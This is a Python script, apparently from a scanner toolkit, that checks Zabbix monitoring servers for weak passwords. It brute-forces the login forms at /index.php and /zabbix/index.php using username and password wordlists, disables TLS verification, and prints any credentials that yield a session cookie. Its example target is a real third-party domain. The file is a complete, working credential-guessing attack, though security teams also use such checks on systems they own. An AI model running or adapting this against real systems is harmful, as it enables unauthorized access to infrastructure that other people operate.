#!/usr/bin/env python3
'''
name: Zabbix弱口令漏洞
description: Zabbix弱口令漏洞
'''

import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

class Zabbix_Weakpwd_BaseVerify():
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0",
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        urls = []
        urls.append(self.url + '/index.php')
        urls.append(self.url + '/zabbix/index.php')
        for user in open('../../username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('../../password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                for url in urls:
                    try:
                        data = {
                            'sid': '84fc9ff1d9310695',
                            'form_refresh': 1,
                            'name': user,
                            'password': pwd,
                            'autologin': 1,
                            'enter': 'Sign in'
                        }
                        req = requests.post(url, headers = self.headers, data = data, allow_redirects = False, verify = False)
                        if 'zbx_sessionid' in req.headers['Set-Cookie'] and req.status_code == 302:
                            result = "exists Zabbix weak password, user: %s, pwd: %s"%(user, pwd)
                            #print(req.status_code)
                            print('存在Zabbix弱口令漏洞,弱口令为', result)
                            return True
                    except Exception as e:
                        #print(e)
                        pass
        print('不存在Zabbix弱口令漏洞')
        return False

if __name__ == '__main__':
    Zabbix_Weakpwd = Zabbix_Weakpwd_BaseVerify('http://baidu.com')
    Zabbix_Weakpwd.run()